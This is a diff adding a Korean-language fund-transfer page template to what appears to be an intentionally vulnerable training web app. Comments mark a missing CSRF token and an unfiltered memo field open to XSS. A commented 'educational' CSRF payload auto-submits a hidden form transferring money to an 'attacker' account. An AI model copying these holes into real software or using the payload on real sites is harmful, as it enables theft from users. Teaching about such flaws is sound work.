@@ -1,0 +1,88 @@
+{% extends 'base.html' %}
+
+{% block title %}송금{% endblock %}
+
+{% block content %}
+<div class="page-container">
+    <div class="page-header">
+        <h1><i class="fas fa-exchange-alt"></i> 송금</h1>
+        <p>다른 회원에게 빠르고 안전하게 송금하세요</p>
+    </div>
+    
+    <div class="content-card">
+        {% if message %}
+            <div class="alert alert-success">
+                <i class="fas fa-check-circle"></i>
+                {{ message }}
+            </div>
+        {% endif %}
+        
+        {% if error %}
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-circle"></i>
+                {{ error }}
+            </div>
+        {% endif %}
+        
+        <!-- 취약점: CSRF 토큰 없음 -->
+        <form method="POST" action="{{ url_for('transfer') }}" class="transfer-form">
+            <div class="form-group">
+                <label for="to_username">
+                    <i class="fas fa-user"></i> 받는 사람 아이디
+                </label>
+                <input type="text" id="to_username" name="to_username" required
+                       placeholder="받는 사람의 아이디를 입력하세요">
+                <small class="form-hint">
+                    회원 검색: <a href="{{ url_for('search') }}">여기를 클릭</a>하여 아이디를 찾을 수 있습니다.
+                </small>
+            </div>
+            
+            <div class="form-group">
+                <label for="amount">
+                    <i class="fas fa-won-sign"></i> 송금 금액
+                </label>
+                <input type="number" id="amount" name="amount" required min="1"
+                       placeholder="금액을 입력하세요">
+            </div>
+            
+            <div class="form-group">
+                <label for="memo">
+                    <i class="fas fa-sticky-note"></i> 메모 (선택)
+                </label>
+                <!-- 취약점: XSS 가능 - memo가 필터링 없이 저장됨 -->
+                <textarea id="memo" name="memo" rows="3" 
+                          placeholder="받는 사람에게 남길 메모를 입력하세요"></textarea>
+            </div>
+            
+            <div class="form-info">
+                <p><i class="fas fa-info-circle"></i> 송금 시 수수료는 무료입니다.</p>
+            </div>
+            
+            <button type="submit" class="btn btn-primary btn-block">
+                <i class="fas fa-paper-plane"></i> 송금하기
+            </button>
+        </form>
+    </div>
+    
+    <!-- CSRF 공격 예시 (교육용 주석) -->
+    <!--
+    CSRF 공격 페이로드 예시:
+    <form action="http://target-site.com/transfer" method="POST" id="csrf-form">
+        <input type="hidden" name="to_username" value="attacker" />
+        <input type="hidden" name="amount" value="10000" />
+        <input type="hidden" name="memo" value="CSRF Attack" />
+    </form>
+    <script>document.getElementById('csrf-form').submit();</script>
+    -->
+</div>
+{% endblock %}
+
+
+
+
+
+
+
+
+
+
